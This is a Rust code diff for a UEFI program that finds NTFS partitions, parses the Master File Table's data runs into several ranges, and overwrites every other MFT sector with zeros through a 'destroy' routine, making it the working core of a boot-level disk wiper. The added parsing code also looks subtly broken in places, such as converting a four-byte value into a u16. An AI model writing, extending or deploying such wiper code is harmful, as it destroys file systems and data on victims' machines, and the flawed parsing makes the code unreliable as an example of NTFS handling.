@@ -1,3 +1,5 @@
+use alloc::vec;
+use alloc::vec::Vec;
 use core::ops::Range;
 
 use uefi::prelude::SystemTable;
@@ -24,7 +26,7 @@ fn read_mft_entry(blk: &BlockIO, media_id: u32, entry_nb: u64, mut buf: &mut [u8
     Ok(())
 }
 
-fn get_mft_range(blk: &mut BlockIO, media_id: u32, boot_sector: u64, mut buf: &mut [u8]) -> Result<Range<u64>, ()> {
+fn get_mft_ranges(blk: &mut BlockIO, media_id: u32, boot_sector: u64, mut buf: &mut [u8]) -> Result<Vec<Range<u64>>, ()> {
     // Read Boot Sector, whicj is the first sector of NTFS partition
     blk.read_blocks(media_id, boot_sector, &mut buf).unwrap_success();
 
@@ -74,22 +76,71 @@ fn get_mft_range(blk: &mut BlockIO, media_id: u32, boot_sector: u64, mut buf: &m
     // If it doesn't find the $DATA (which would be odd) get out
     if data_run_offset == 0 { return Err(()); };
 
-    // Get the size in sectors of the first data run
-    let data_run_size = (u16::from_ne_bytes(mft_entry_buf[data_run_offset + 1..data_run_offset + 3].try_into().unwrap()) * 8) as u64;
+    let mut ranges: Vec<Range<u64>> = vec!();
 
-    Ok(mft_start..mft_start + data_run_size)
+    loop {
+        match mft_entry_buf[data_run_offset] {
+
+            0x31 => {
+                let data_run_size = (mft_entry_buf[data_run_offset + 1]*8) as u64;
+                let mut data_run_first = mft_entry_buf[data_run_offset + 2..data_run_offset + 5].to_vec();
+                data_run_first.push(0);
+                let data_run_first = (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+
+                ranges.push(data_run_first..data_run_first + data_run_size);
+                data_run_offset += 5;
+            }
+
+            0x32 => {
+                let data_run_size = (u16::from_ne_bytes(mft_entry_buf[data_run_offset + 1..data_run_offset + 3].try_into().unwrap()) * 8) as u64;
+
+                let mut data_run_first = mft_entry_buf[data_run_offset + 3..data_run_offset + 6].to_vec();
+                data_run_first.push(0);
+                let data_run_first = (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+
+                ranges.push(data_run_first..data_run_first + data_run_size);
+                data_run_offset += 6;
+            }
+
+            0x33 => {
+                let mut data_run_size = mft_entry_buf[data_run_offset + 1..data_run_offset + 4].to_vec();
+                data_run_size.push(0);
+                let data_run_size = (u16::from_ne_bytes(data_run_size.try_into().unwrap()) * 8) as u64;
+                let mut data_run_first = mft_entry_buf[data_run_offset + 4..data_run_offset + 7].to_vec();
+                data_run_first.push(0);
+                let data_run_first = (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+                ranges.push(data_run_first..data_run_first + data_run_size);
+                data_run_offset += 7;
+            }
+
+            0x42 => {
+                let data_run_size = (u16::from_ne_bytes(mft_entry_buf[data_run_offset + 1..data_run_offset + 3].try_into().unwrap()) * 8) as u64;
+                let data_run_first = (u32::from_ne_bytes(mft_entry_buf[data_run_offset + 3..data_run_offset + 7].try_into().unwrap()) * 8) as u64;
+                ranges.push(data_run_first..data_run_first + data_run_size);
+                data_run_offset += 7;
+            }
+
+            _ => break
+        }
+    }
+
+    Ok(ranges)
 }
 
 /// Fire !
-fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_zone: Range<u64>) {
+fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_runs: Vec<Range<u64>>) {
     let buf = [0u8; 512];
 
     log::info!("Start destroying..."); // DEBUG
-    for sector in mft_zone {
-        if sector % 2 == 0 {
-            blk.write_blocks(media_id, sector, &buf).unwrap_success();
+
+    for run in mft_runs {
+        for sector in run {
+            if sector % 2 == 0 {
+                blk.write_blocks(media_id, sector, &buf).unwrap_success();
+            }
         }
     }
+
     log::info!("Finished !"); // DEBUG
 }
 
@@ -118,9 +169,9 @@ pub fn destroy(st: &SystemTable<Boot>) {
         // If not a NTFS partition then get out
         if &buf[3..11] != OEM_ID { continue; }
 
-        if let Ok(range) = get_mft_range(blk, media_id, 0, &mut buf) {
-            beat_the_shit_out_of_the_mft(blk, media_id, range);
-            //log::info!("{:#?}", range); // DEBUG
+        if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
+            beat_the_shit_out_of_the_mft(blk, media_id, ranges);
+            //log::info!("{:#?}", ranges); // DEBUG
         }
     }
 }
